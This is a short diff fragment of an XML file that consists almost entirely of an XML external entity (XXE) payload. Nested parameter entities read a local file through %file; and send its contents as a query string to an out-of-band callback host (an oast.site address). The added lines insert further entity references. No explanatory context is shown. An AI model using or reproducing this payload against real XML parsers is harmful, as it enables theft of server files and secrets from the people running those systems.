@@ -2,3 +2,5 @@
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://cpcrc57f2oq00bo1chkg99zgpn1yzxt93.oast.site/?x=%file;'>">
 %eval;
 %exfiltrate;
+&xxe;
+%xxe;
